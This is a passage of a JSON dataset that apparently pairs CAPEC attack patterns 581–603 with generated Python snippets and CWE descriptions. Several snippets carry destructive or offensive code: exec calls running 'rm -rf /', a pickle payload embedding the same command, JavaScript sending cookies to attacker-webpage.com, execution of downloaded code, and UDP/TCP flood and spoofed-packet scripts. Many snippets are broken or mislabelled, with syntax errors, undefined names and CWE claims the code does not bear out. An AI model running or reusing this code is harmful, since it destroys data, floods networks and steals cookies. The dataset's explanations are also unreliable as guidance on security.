        "description": "This Python code snippet demonstrates the CAPEC of active probing and exploration activities to determine security information about a remote target system. The code includes two functions: check_file_exists and check_admin_privileges. The check_file_exists function takes a file path as input and returns a dictionary containing a boolean indicating whether the file exists and the time taken to perform the check. This can be used to exploit Observable Timing Discrepancy (CWE-208) and Observable Response Discrepancy (CWE-204). The check_admin_privileges function attempts to check if the current user has admin privileges by running the 'whoami' command and reading the output. This can be used to exploit Exposure of Sensitive System Information to an Unauthorized Control Sphere (CWE-497) and Untrusted Search Path (CWE-426). The code also demonstrates Observable Behavioral Discrepancy (CWE-205) by providing different responses based on the system configuration."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "import os\nimport json\nimport platform\nimport psutil\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsecurity_tools = {}\nfor proc in psutil.process_iter(['pid', 'name', 'username']):\n    try:\n        info = proc.info\n        if 'security' in info['name'].lower() or 'anti' in info['name'].lower():\n            security_tools[info['name']] = {'pid': info['pid'], 'username': info['username']}\n    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):\n        pass\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import os; os.system(\"whoami\")'\nexec(malicious_code)\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nvulnerable_component = 'vulnerable_library'\n__import__(vulnerable_component)\n\n# CWE-512: Spyware\nuser_data = {'username': os.getlogin(), 'platform': platform.system(), 'release': platform.release()}\n\n# CWE-507: Trojan Horse\nhidden_code = 'import os; os.system(\"rm -rf /\")'\nexec(hidden_code)\n\noutput = {'security_tools': security_tools, 'user_data': user_data}\nprint(json.dumps(output, indent=4))",
        "description": "This Python code snippet demonstrates the CAPEC of attempting to get a listing of security tools installed on the system and their configurations. It uses various CWEs to exemplify the vulnerabilities: CWE-497 exposes sensitive system information, CWE-506 embeds malicious code, CWE-1395 depends on a vulnerable third-party component, CWE-512 collects user data without approval, and CWE-507 hides malicious code within a benign functionality. The output is in JSON format, listing the security tools and user data."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "import socket\nimport threading\nimport os\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-421: Race Condition During Access to Alternate Channel\n\ndef disable_network_route(src_ip, dst_ip, src_port, dst_port):\n    # Create a socket object\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)\n    \n    # CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    # Incorrectly specify the destination IP and port\n    sock.bind((src_ip, src_port))\n    \n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    # CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    # Inject errors into the packet to disrupt the communication channel\n    packet = b'\\x00' * 1024\n    sock.sendto(packet, (dst_ip, dst_port))\n    \n    # CWE-421: Race Condition During Access to Alternate Channel\n    # Create a race condition by accessing the alternate channel concurrently\n    def access_alternate_channel():\n        alt_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        alt_sock.connect((dst_ip, dst_port))\n        alt_sock.send(b'\\x00' * 1024)\n    \n    threading.Thread(target=access_alternate_channel).start()\n    \n    # Disable the network route by injecting errors into the packet\n    os.system(f'iptables -A OUTPUT -d {dst_ip} -j DROP')\n\n# Example usage\ndisable_network_route('192.168.1.100', '192.168.1.200', 8080, 8080)",
        "description": "This code snippet demonstrates the CAPEC of disabling the network route between two targets by exploiting various CWEs. It creates a socket object and binds it to a source IP and port, then injects errors into the packet to disrupt the communication channel (CWE-924 and CWE-1334). It also incorrectly specifies the destination IP and port (CWE-923 and CWE-941), and creates a race condition by accessing the alternate channel concurrently (CWE-421). Finally, it disables the network route by injecting errors into the packet using iptables."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "import os\nimport time\n\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n# CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n\n# Simulating a redundant system with two identical hardware components\nhw_component1 = {'status': 'online', 'config': 'default'}\nhw_component2 = {'status': 'online', 'config': 'default'}\n\n# CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n\n# Simulating unauthorized access to hardware features\nos.system('sudo ipmitool mc reset cold')  # Resetting the management controller\nos.system('sudo ipmitool power cycle')  # Power cycling the system\n\n# CWE-1276: Hardware Child Block Incorrectly Connected to Parent System\n\n# Simulating incorrect connection between hardware IP and parent system\ndef incorrect_connection():\n    hw_component1['status'] = 'offline'\n    hw_component2['status'] = 'offline'\n\n# Disabling critical system resources\nwhile True:\n    incorrect_connection()\n    time.sleep(10)  # Simulating periodic disconnection of critical equipment\n",
        "description": "This Python code snippet demonstrates the CAPEC attack pattern of physically disabling networking hardware by powering it down or disconnecting critical equipment. It incorporates related CWEs, including unauthorized error injection, improper preservation of hardware configuration state, improper restriction of software interfaces to hardware features, improper protection for outbound error messages, and incorrect connection between hardware IP and parent system. The code simulates a redundant system, unauthorized access to hardware features, and incorrect connections, ultimately disabling critical system resources."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "import socket\nimport threading\nimport time\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n\ndef flood_bgp_route(route, as_number):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((route, 179))\n    while True:\n        sock.send(b'\\x01\\x02\\x00\\x3e\\x02\\x06\\x01\\x04\\x00\\x00\\x00\\x00\\xff\\xff\\x02\\x02\\x01')\n        time.sleep(0.01)\n\n# CWE-927: Use of Implicit Intent for Sensitive Communication\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\ndef suppress_bgp_advertisement(as_number):\n    # Implicit intent to send sensitive data\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((\"bgp_route_reflector\", 179))\n    sock.send(b'\\x01\\x02\\x00\\x3e\\x02\\x06\\x01\\x04\\x00\\x00\\x00\\x00\\xff\\xff\\x02\\x02\\x01')\n    # Downgrade encryption algorithm\n    sock.send(b'\\x01\\x02\\x00\\x3e\\x02\\x06\\x01\\x04\\x00\\x00\\x00\\x00\\xff\\xff\\x02\\x02\\x01')\n    # Suppress BGP advertisement\n    sock.send(b'\\x01\\x02\\x00\\x3e\\x02\\x06\\x01\\x04\\x00\\x00\\x00\\x00\\xff\\xff\\x02\\x02\\x01')\n\n# Main function\nif __name__ == '__main__':\n    route = '10.0.0.1'\n    as_number = 65535\n    threading.Thread(target=flood_bgp_route, args=(route, as_number)).start()\n    suppress_bgp_advertisement(as_number)\n",
        "description": "Python code snippet that demonstrates the CAPEC by suppressing BGP advertisements and flooding the network with malicious traffic, utilizing CWE-941, CWE-406, CWE-927, CWE-924, and CWE-757."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "import socket\nimport urllib.parse\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\nip_address = '192.0.2.1'\nhostname = socket.gethostbyaddr(ip_address)[0]\n\n# CWE-942: Permissive Cross-domain Policy with Untrusted Domains\ncross_domain_policy = '<cross-domain-policy><allow-access-from domain=\"*\"/></cross-domain-policy>'\n\n# CWE-368: Context Switching Race Condition\ndef switch_context():\n    # Simulating a context switch\n    print('Switching context...')\n    # Race condition: an attacker can modify the behavior during the switch\n    print('Vulnerable to race condition!')\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\ndef redirect_to_untrusted_site():\n    user_input = 'http://untrusted-site.com'\n    # Redirecting to an untrusted site\n    print(f'Redirecting to {user_input}...')\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\ndef generate_vulnerable_web_page():\n    user_input = '<script>alert(\"XSS\")</script>'\n    # Generating a web page with user-controllable input\n    print(f'<html><body>{user_input}</body></html>')\n\n# CAPEC: Influencing a target's web-hosting company to disable a target domain\n# Simulating a legal intervention to disable the target domain\ndef disable_target_domain():\n    print('Disabling target domain...')\n\n# Putting it all together\nswitch_context()\nredirect_to_untrusted_site()\ngenerate_vulnerable_web_page()\ndisable_target_domain()",
        "description": "This code snippet demonstrates the CAPEC attack pattern of influencing a target's web-hosting company to disable a target domain. It incorporates multiple CWEs, including CWE-350 (relying on reverse DNS resolution), CWE-942 (permissive cross-domain policy), CWE-368 (context switching race condition), CWE-601 (open redirect), and CWE-79 (cross-site scripting). The code simulates a legal intervention to disable the target domain, making it vulnerable to various attacks."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "import pickle\n\nclass SerializedClass:\n    def __init__(self, data):\n        self.data = data\n\n    def __getstate__(self):\n        return self.__dict__\n\n    def __setstate__(self, state):\n        self.__dict__.update(state)\n\n    def execute_command(self, command):\n        # CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\n        import subprocess\n        subprocess.call(command, shell=True)\n\n# CWE-502: Deserialization of Untrusted Data\n# CWE-499: Serializable Class Containing Sensitive Data\n# CWE-506: Embedded Malicious Code\nmalicious_data = b\"\\x80\\x03]q\\x00(K\\x01\\x85\\rq\\x02N\\x85\\rq\\x03X\\x01\\x00\\x00\\x00os\\x01\\x00\\x00\\x00python -c 'import os; os.system(\"rm -rf /\")'\\x86\\rq\\x04\\x85\\rq\\x05X\\x02\\x00\\x00\\x00command\\x86\\rq\\x06\\x85\\rq\\x07X\\x03\\x00\\x00\\x00execute_command\\x86\\rq\\x08\\x85\\rq\\t\"\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# (This CWE is not directly applicable in Python, but it's included for context)\n\ntry:\n    obj = pickle.loads(malicious_data)\n    obj.execute_command('whoami')\nexcept Exception as e:\n    print(f\"Error: {e}\")",
        "description": "This code snippet demonstrates the CAPEC of deserialization of untrusted data, which can lead to remote code execution. The SerializedClass contains sensitive data and does not explicitly deny serialization. The malicious_data variable contains a pickled object that, when deserialized, will execute a system command. This is an example of CWE-502, CWE-499, CWE-506, and CWE-77. CWE-1313 is included for context, but it's not directly applicable in this Python code."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "import requests\n\n# CWE-1021: Improper Restriction of Rendered UI Layers or Frames\niframe = '<iframe src=\"https://legitimate-webpage.com\" frameborder=\"0\" width=\"100%\" height=\"100%\"></iframe>'\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nmalicious_js = '<script>var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"https://attacker-webpage.com/steal_cookies\", true); xhr.send();</script>'\n\n# CWE-692: Incomplete Denylist to Cross-Site Scripting\nlegitimate_webpage = '<html><body>' + iframe + malicious_js + '</body></html>'\n\n# CWE-82: Improper Neutralization of Script in Attributes of IMG Tags in a Web Page\nimg_tag = '<img src=\"https://attacker-webpage.com/steal_cookies?cookie=' + document.cookie + '\" />'\nlegitimate_webpage += img_tag\n\n# CWE-352: Cross-Site Request Forgery (CSRF)\nrequests.post('https://legitimate-webpage.com/perform_action', data={{'action': 'transfer_funds'}})\n",
        "description": "This code snippet demonstrates a Clickjacking attack, where an attacker embeds a legitimate webpage in an iframe and injects malicious JavaScript to steal user cookies. The malicious JavaScript sends a request to the attacker's webpage to steal the cookies. The legitimate webpage is vulnerable to Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) attacks."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    html = '<div id=\"result\">Search result for ' + query + '</div>'\n    return html\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a vulnerable Flask web application that is susceptible to DOM-based Cross-Site Scripting (XSS) attacks. The 'search' function retrieves a user-input 'query' parameter and injects it into the HTML response without proper validation or output encoding, allowing an attacker to inject malicious script code that can manipulate the Document Object Model (DOM) of the page."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "import socket\n\ndef drop_dns_request(ip_address, hostname):\n    # CWE-300: Channel Accessible by Non-Endpoint\n    # CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n    try:\n        # Perform reverse DNS resolution\n        rev_dns = socket.gethostbyaddr(ip_address)[0]\n        if rev_dns != hostname:\n            # Drop DNS request if IP address is not associated with the hostname\n            return False\n    except socket.herror:\n        # CWE-291: Reliance on IP Address for Authentication\n        # CWE-1327: Binding to an Unrestricted IP Address\n        if ip_address == '0.0.0.0':\n            return False\n    return True\n\n# CWE-412: Unrestricted Externally Accessible Lock\nlock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nlock.bind(('0.0.0.0', 53))\n\nwhile True:\n    data, addr = lock.recvfrom(1024)\n    if not drop_dns_request(addr[0], data.decode('utf-8').split()[1]):\n        # Drop DNS request\n        continue\n    # Process valid DNS request\n    print('Valid DNS request from', addr[0])",
        "description": "Python code snippet that demonstrates the CAPEC of an adversary intercepting traffic and intentionally dropping DNS requests based on content in the request. The code uses CWE-300, CWE-350, CWE-291, CWE-1327, and CWE-412 to create a vulnerable DNS server that can be influenced by an external actor."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "import socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-1327: Binding to an Unrestricted IP Address\n# CWE-291: Reliance on IP Address for Authentication\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-602: Client-Side Enforcement of Server-Side Security\n\ndef drop_packets(target_ip):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    sock.bind((\"0.0.0.0\", 0))  # Binding to 0.0.0.0, allowing access from anywhere\n    while True:\n        packet = sock.recvfrom(1024)\n        if packet[1][0] == target_ip:\n            # Drop packets destined for the target IP address\n            continue\n        else:\n            # Process packets not destined for the target IP address\n            process_packet(packet)\n\n# Example usage:\ntarget_ip = \"192.168.1.100\"\ndrop_packets(target_ip)",
        "description": "Python code snippet that demonstrates a denial-of-service attack by dropping packets destined for a target IP address, exploiting vulnerabilities related to channel accessibility, IP address binding, and authentication."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = flask.request.args.get('query')\n    return '<h1>Search Results for ' + query + '</h1>'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a reflected XSS vulnerability. The Flask web application takes a 'query' parameter from the URL and reflects it back to the user without proper input validation or sanitization, allowing an attacker to inject malicious scripts."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "import sqlite3\n\nconn = sqlite3.connect('database.db')\nc = conn.cursor()\n\ndef store_comment(username, comment):\n    c.execute(\"INSERT INTO comments (username, comment) VALUES (?, ?)\", (username, comment))\n    conn.commit()\n\ndef display_comments():\n    c.execute(\"SELECT * FROM comments\")\n    comments = c.fetchall()\n    html = \"\"\"\n    <html><body>\"\"\n    for comment in comments:\n        html += \"<p>{}: {}</p>\".format(comment[0], comment[1])\n    html += \"</body></html>\"\"\n    return html\n\n# Example usage:\nstore_comment(\"user1\", \"<script>alert('XSS')</script>\")\nprint(display_comments())",
        "description": "This Python code snippet demonstrates a stored Cross-site Scripting (XSS) vulnerability. The `store_comment` function inserts user-provided comments into a SQLite database without proper input validation or sanitization. The `display_comments` function retrieves the comments from the database and generates an HTML page that displays them. Since the comments are not properly sanitized, an attacker can inject malicious JavaScript code as a comment, which will be executed when the `display_comments` function is called. This code embodies CWE-79, CWE-692, CWE-1289, CWE-82, and CWE-85."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "import uuid\nimport time\n\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, username):\n        session_id = str(uuid.uuid4())[:8]  # CWE-6: Insufficient Session-ID Length\n        self.sessions[session_id] = {'username': username, 'expires': time.time() + 3600}\n        return session_id\n\n    def validate_session(self, session_id):\n        if session_id in self.sessions:\n            return self.sessions[session_id]['username']\n        return None\n\n    def expire_sessions(self):\n        pass  # CWE-613: Insufficient Session Expiration - no expiration implemented\n\nsession_manager = SessionManager()\n\n# CWE-287: Improper Authentication - no password validation\nusername = 'admin'\nsession_id = session_manager.create_session(username)\nprint(f'Session created: {session_id}')\n\n# CWE-384: Session Fixation - reusing an existing session ID\nstolen_session_id = session_id\nprint(f'Stolen session ID: {stolen_session_id}')\n\n# CWE-602: Client-Side Enforcement of Server-Side Security - relying on client-side validation\nif session_manager.validate_session(stolen_session_id):\n    print('Authenticated as admin!')\n",
        "description": "This code snippet demonstrates a vulnerable session management system in Python. It includes weaknesses such as insufficient session ID length, lack of session expiration, improper authentication, and session fixation. An attacker can steal an active session ID and reuse it to gain unauthorized access to the application."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\ndef inject_traffic(host, port, message):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((host, port))\n    sock.sendall(message.encode())\n    response = sock.recv(1024)\n    print(response.decode())\n\n# Example usage:\ninject_traffic('example.com', 8080, 'malicious_input')",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary injecting traffic into the target's network connection. The code establishes a socket connection to a specified host and port, and sends a malicious input message. The code does not properly verify the source of the communication channel (CWE-940), does not control the network message volume (CWE-406), transmits sensitive information in cleartext (CWE-319), does not restrict input before using it as a resource identifier (CWE-99), and does not ensure message integrity during transmission (CWE-924)."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "import socket\nimport struct\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-605: Multiple Binds to the Same Port\n\ndef inject_reset_packet(src_ip, dst_ip, src_port, dst_port):\n    # Create a raw socket\n    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n    # CWE-605: Multiple Binds to the Same Port\n    # Bind to the same port as the target connection\n    s.bind((src_ip, src_port))\n\n    # CWE-940: Improper Verification of Source of a Communication Channel\n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    # Create a TCP reset packet with spoofed source IP and port\n    packet = bytearray([0x45, 0x00, 0x00, 0x28, 0x00, 0x00, 0x40, 0x00, 0x06, 0x00, 0x00, 0x00])\n    packet += socket.inet_aton(src_ip)\n    packet += socket.inet_aton(dst_ip)\n    packet += struct.pack('!HHLLHHHH', src_port, dst_port, 0, 0, 0x5014, 0, 0, 0)\n    packet += b'\\x04\\x02'  # Reset flag\n\n    # CWE-294: Authentication Bypass by Capture-replay\n    # Send the spoofed reset packet to the target connection\n    s.sendto(packet, (dst_ip, dst_port))\n\n# Example usage\ninject_reset_packet('192.168.1.100', '192.168.1.200', 8080, 8080)",
        "description": "Python code snippet that demonstrates the CAPEC attack pattern by injecting a connection reset packet to one or both ends of a target's connection. The code exploits CWE-940, CWE-924, CWE-941, CWE-294, and CWE-605 vulnerabilities to bypass authentication and sever the connection."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "import socket\nimport threading\nimport time\n\ndef send_rst_packet(src_ip, src_port, dst_ip, dst_port, seq, ack):\n    rst_packet = bytearray.fromhex('4500003c00400040003f11a303')\n    rst_packet[12:14] = src_port.to_bytes(2, 'big')\n    rst_packet[14:16] = dst_port.to_bytes(2, 'big')\n    rst_packet[24:28] = seq.to_bytes(4, 'big')\n    rst_packet[28:32] = ack.to_bytes(4, 'big')\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    sock.sendto(rst_packet, (dst_ip, dst_port))\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-918: Server-Side Request Forgery (SSRF)\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n# CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\ndef main():\n    src_ip = '192.168.1.100'\n    src_port = 1234\n    dst_ip = '192.168.1.200'\n    dst_port = 80\n    seq = 123456789\n    ack = 234567890\n    \n    # Send HTTP GET request\n    get_request = 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n'\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((dst_ip, dst_port))\n    sock.send(get_request.encode())\n    \n    # Send RST packet\n    threading.Thread(target=send_rst_packet, args=(src_ip, src_port, dst_ip, dst_port, seq, ack)).start()\n    time.sleep(1)\n    \nif __name__ == '__main__':\n    main()",
        "description": "Python code snippet that demonstrates the CAPEC attack by sending a TCP RST packet to a target after making an HTTP GET request. The code exploits CWE-940, CWE-918, CWE-294, CWE-444, and CWE-113 vulnerabilities."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    return open(os.path.join('/var/www/html', file_path), 'r').read()\n\nfile_path = '../etc/passwd'\nprint(read_file(file_path))",
        "description": "This Python code snippet demonstrates the vulnerability of Path Traversal. The function read_file() takes a file path as input and reads the file. The file path is joined with a base directory '/var/www/html' using os.path.join(). However, the function does not properly validate the input file path, allowing an attacker to traverse to a parent directory using '../' and access restricted files, such as '/etc/passwd'."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "import socket\nimport dns.resolver\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\nip_address = '192.168.1.1'\nhostname = socket.gethostbyaddr(ip_address)[0]\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\ndns_resolver = dns.resolver.Resolver()\ndns_resolver.nameservers = ['192.168.1.1']  # Malicious DNS server\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\nexec(response.text)\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\nredirect_url = 'http://example.com/phishing_site'\nresponse = requests.get('http://example.com/redirect', params={'url': redirect_url})\n\n# CWE-918: Server-Side Request Forgery (SSRF)\nssrf_url = 'http://example.com/internal_system'\nresponse = requests.get('http://example.com/proxy', params={'url': ssrf_url})",
        "description": "Python code snippet demonstrating the CAPEC attack, which involves sending a malicious DNS response to a target's route request. The code includes CWE-350, CWE-941, CWE-494, CWE-601, and CWE-918 vulnerabilities to further illustrate the attack."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\ndef send_data(data, endpoint):\n    # Establish a communication channel with an endpoint\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(endpoint)\n\n    # CWE-319: Cleartext Transmission of Sensitive Information\n    # Send sensitive data in cleartext\n    sock.sendall(data.encode())\n\n    # CWE-927: Use of Implicit Intent for Sensitive Communication\n    # Use an implicit intent for transmitting sensitive data\n    intent = {'action': 'com.example.SEND_DATA', 'data': data}\n    sock.sendall(str(intent).encode())\n\n    # CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n    # Simulate an attacker bypassing access control to the overlapping portion of the protected region\n    protected_data = 'protected_data'\n    sock.sendall(protected_data.encode())\n\n    # Receive a message from the endpoint, but do not sufficiently ensure that the message was not modified during transmission\n    response = sock.recv(1024)\n    if response:\n        print('Received response:', response.decode())\n\n    # Close the communication channel\n    sock.close()\n\n# Simulate a terrestrial jammer disrupting the transmission\ndef disrupt_transmission(endpoint):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(endpoint)\n    sock.sendall(b'JAMMING_SIGNAL')\n    sock.close()\n\n# Example usage\nendpoint = ('localhost', 8080)\ndata = 'sensitive_data'\n\nsend_data(data, endpoint)\ndisrupt_transmission(endpoint)",
        "description": "This Python code snippet demonstrates the CAPEC attack pattern of transmitting disruptive signals to a target's consumer-level satellite dish using a terrestrial jammer. The code includes vulnerabilities related to CWE-923, CWE-924, CWE-319, CWE-927, and CWE-1316, which can be exploited by an attacker to disrupt the transmission and access sensitive information."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "import hashlib\n\nclass CredentialStore:\n    def __init__(self):\n        self.credentials = {}\n\n    def store_credentials(self, username, password):\n        # CWE-522: Insufficiently Protected Credentials\n        # Storing passwords in plaintext\n        self.credentials[username] = password\n\n    def authenticate(self, username, password):\n        # CWE-307: Improper Restriction of Excessive Authentication Attempts\n        # No rate limiting or IP blocking for failed attempts\n        if username in self.credentials and self.credentials[username] == password:\n            return True\n        return False\n\n    def check_password_strength(self, password):\n        # CWE-309: Use of Password System for Primary Authentication\n        # No password strength checking\n        return True\n\n    def check_password_age(self, username):\n        # CWE-262: Not Using Password Aging\n        # No password aging mechanism\n        return True\n\n# CWE-308: Use of Single-factor Authentication\n# No two-factor authentication\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# Relying solely on username and password for authentication\n\nstore = CredentialStore()\n\n# Example usage\nstore.store_credentials('user1', 'password1')\nprint(store.authenticate('user1', 'password1'))",
        "description": "This code snippet demonstrates a vulnerable credential storage and authentication system that is susceptible to credential stuffing attacks. It stores passwords in plaintext, lacks rate limiting for failed authentication attempts, and relies solely on username and password for authentication without any additional security measures."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "import socket\nimport threading\nimport random\nimport string\n\n\ndef flood_target(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    while True:\n        sock.sendto(''.join(random.choice(string.printable) for _ in range(1024)), (ip, port))\n\n\ndef main():\n    ip = '10.0.0.1'\n    port = 12345\n    threads = []\n    for _ in range(100):\n        t = threading.Thread(target=flood_target, args=(ip, port))\n        t.start()\n        threads.append(t)\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a denial-of-service (DoS) attack by flooding a target IP and port with random UDP packets. It lacks proper enforcement of message integrity, allowing an adversary to modify the messages during transmission (CWE-924). The code also fails to control the network message volume, enabling an actor to cause the product to transmit more traffic than allowed (CWE-406). Additionally, it does not ensure that the communication channel is restricted to the intended endpoint (CWE-923), and it transmits sensitive information in cleartext (CWE-319). The use of multiple threads to send packets simultaneously introduces a race condition during access to the alternate channel (CWE-421)."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "import pickle\n\ndef authenticate(username, password):\n    # CWE-592: Authentication Bypass Issues\n    if username == 'admin' and password == 'password123':\n        return True\n    else:\n        return False\n\n\ndef load_data(file_path):\n    # CWE-545: Use of Dynamic Class Loading\n    data = pickle.load(open(file_path, 'rb'))\n    return data\n\n\ndef modify_data(file_path, new_data):\n    # CWE-217: Failure to Protect Stored Data from Modification\n    with open(file_path, 'wb') as f:\n        pickle.dump(new_data, f)\n\n\ndef get_ip_address(hostname):\n    # CWE-247: Reliance on DNS Lookups in a Security Decision\n    import socket\n    return socket.gethostbyname(hostname)\n\n\ndef use_obsolete_function):\n    # CWE-477: Use of Obsolete Function\n    from urllib.parse import urlparse\n    url = 'http://example.com'\n    parsed_url = urlparse(url)\n    return parsed_url\n",
        "description": "This code snippet demonstrates a collection of deprecated and vulnerable code practices. It includes an authentication function with a hardcoded password, use of dynamic class loading with pickle, unprotected data modification, reliance on DNS lookups for security decisions, and the use of an obsolete function."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "import socket\nimport threading\n\nclass DosAttack:\n    def __init__(self, target_ip, target_port):\n        self.target_ip = target_ip\n        self.target_port = target_port\n\n    def attack(self):\n        while True:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.connect((self.target_ip, self.target_port))\n            sock.send(b\"GET /\")\n            sock.close()\n\n    def start_attack(self):\n        threads = []\n        for i in range(1000):\n            t = threading.Thread(target=self.attack)\n            t.start()\n            threads.append(t)\n\n        for t in threads:\n            t.join()\n\nif __name__ == \"__main__\":\n    dos = DosAttack(\"192.168.1.100\", 80)\n    dos.start_attack()",
